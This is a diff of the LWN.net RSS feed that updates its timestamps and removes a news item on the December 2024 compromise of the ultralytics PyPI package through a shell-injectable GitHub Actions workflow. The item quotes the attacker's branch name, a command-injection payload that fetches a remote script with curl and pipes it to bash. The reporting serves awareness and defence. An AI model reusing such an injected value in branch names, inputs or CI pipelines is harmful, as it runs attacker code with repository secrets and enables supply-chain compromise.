@@ -8,8 +8,8 @@
         listing all articles which are posted to the site front page.</description>
         <language>en-us</language>
         <webMaster>lwn@lwn.net</webMaster>
-        <pubDate>Fri, 13 Dec 2024 18:22:59 +0000</pubDate>
-        <lastBuildDate>Fri, 13 Dec 2024 18:52:39 +0000</lastBuildDate>
+        <pubDate>Fri, 13 Dec 2024 19:01:02 +0000</pubDate>
+        <lastBuildDate>Fri, 13 Dec 2024 19:09:24 +0000</lastBuildDate>
         <docs>https://www.rssboard.org/rss-specification</docs>
         <atom:link href="https://lwn.net/headlines/rss" rel="self" type="application/rss+xml">
         </atom:link>
@@ -441,39 +441,6 @@ href="https://lwn.net/Articles/998221/">this article</a>.]]></description>
             <guid>https://lwn.net/Articles/1001435/</guid>
             <pubDate>Mon, 09 Dec 2024 14:31:25 +0000</pubDate>
             <dc:creator>corbet</dc:creator>
-        </item>
-        <item>
-            <title>Abusing Git branch names to compromise a PyPI package</title>
-            <link>https://lwn.net/Articles/1001215/</link>
-            <description><![CDATA[<p>
-A compromised release was uploaded to PyPI after a project automatically processed a pull request with a flawed script.
-The GitHub account 
-<a href="https://github.com/openimbot">
-"OpenIM Robot"</a>
-(which appears to be controlled by
-<a href="https://nsddd.top/">Xinwei Xiong</a>) opened
-<a href="https://github.com/ultralytics/ultralytics/pull/18018">a pull request</a> for the 
-<a href="https://pypi.org/project/ultralytics/">
-ultralytics</a>
-Python package. The pull request included a suspicious Git branch name:
-</p>
-
-<blockquote class="bq">
-openimbot:$({curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/12e4f54ca3f2e69bcdc900d1c6e16642ca8ae545/file.sh}${IFS}|${IFS}bash)
-</blockquote>
-
-<p>
-Unfortunately, ultralytics uses the
-<a href="https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#pull_request_target"><tt>pull_request_target</tt></a> GitHub Action trigger to automate some of its continuous integration tasks. This runs a script from the base branch of the repository, which has access to the repository's secrets — but that script was vulnerable to a shell injection attack from the branch name of the pull request. The injected script appears to have used the credentials it had access to in order to compromise a later release uploaded to PyPI to include a cryptocurrency miner. It is hard to be sure of the details, because GitHub has already pulled the malicious script.
-</p>
-
-<p>
-This problem has been
-<a href="https://nathandavison.com/blog/github-actions-and-the-threat-of-malicious-pull-requests">known</a> for several years, but this event may serve as a good reminder to be careful with automated access to important secrets.
-</p>]]></description>
-            <guid>https://lwn.net/Articles/1001215/</guid>
-            <pubDate>Fri, 06 Dec 2024 18:44:12 +0000</pubDate>
-            <dc:creator>daroc</dc:creator>
         </item>
     </channel>
 </rss>
